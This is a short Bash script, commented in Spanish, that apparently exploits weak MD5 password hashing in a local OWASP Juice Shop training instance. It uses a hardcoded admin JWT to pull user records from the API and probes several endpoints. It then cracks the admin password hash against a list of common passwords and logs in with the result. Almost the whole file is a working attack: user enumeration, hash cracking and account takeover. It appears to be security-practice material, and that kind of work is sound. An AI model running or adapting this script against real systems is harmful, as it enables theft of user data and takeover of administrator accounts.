#!/bin/bash
echo "=== EJECUTANDO VULNERABILIDAD WEAK PASSWORD HASHING (MD5) ==="

TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTEtMjMgMTc6Mzk6MjguNDAwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTEtMjMgMTc6Mzk6MjguNDAwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MzkxOTY4NX0.jcI3V4J9IfSh4eHMrAncWgJn4cZQxbKX30PubzJAgXCEZFccepziSKjIxvpQOMSJqr52pnW78koh041OakkyZIAoe5yCDYXTlipI6K3fbipGmAV-bRMRm1puo9fUbScfTzUJPDjddDJpJxJmOE50cyAyk7CP1GyyOKcbHfO26t4"

echo -e "\n1. OBTENIENDO DATOS DE USUARIOS..."
curl -H "Authorization: Bearer $TOKEN" -s "http://localhost:3000/api/Users" | jq '.' 2>/dev/null

echo -e "\n2. BUSCANDO ENDPOINTS..."
for endpoint in "users" "Users" "user" "User" "authentication" "admin/users"; do
  echo "Probando: /rest/$endpoint"
  curl -H "Authorization: Bearer $TOKEN" -s "http://localhost:3000/rest/$endpoint" | head -1
done

echo -e "\n3. IDENTIFICANDO MD5..."
echo "Hash MD5 del admin: 0192023a7bbd73250516f069df18b500"
echo -n "password" | md5sum
echo -n "admin123" | md5sum

echo -e "\n4. CRACKEANDO HASH..."
echo "0192023a7bbd73250516f069df18b500" > hash.txt

# Crackeo manual
echo "Probando contraseñas comunes..."
passwords=("admin123" "password" "123456" "admin" "juice" "shop")
for pwd in "${passwords[@]}"; do
    hash=$(echo -n "$pwd" | md5sum | awk '{print $1}')
    if [ "$hash" == "0192023a7bbd73250516f069df18b500" ]; then
        echo "✅ CONTRASEÑA ENCONTRADA: $pwd"
        CRACKED_PWD="$pwd"
        break
    fi
done

echo -e "\n5. VERIFICANDO CONTRASEÑA..."
if [ ! -z "$CRACKED_PWD" ]; then
    echo "Probando login con: $CRACKED_PWD"
    curl -X POST http://localhost:3000/rest/user/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$CRACKED_PWD\"}"
else
    echo "❌ No se pudo crackear la contraseña"
fi

echo -e "\n=== EJECUCIÓN COMPLETADA ==="
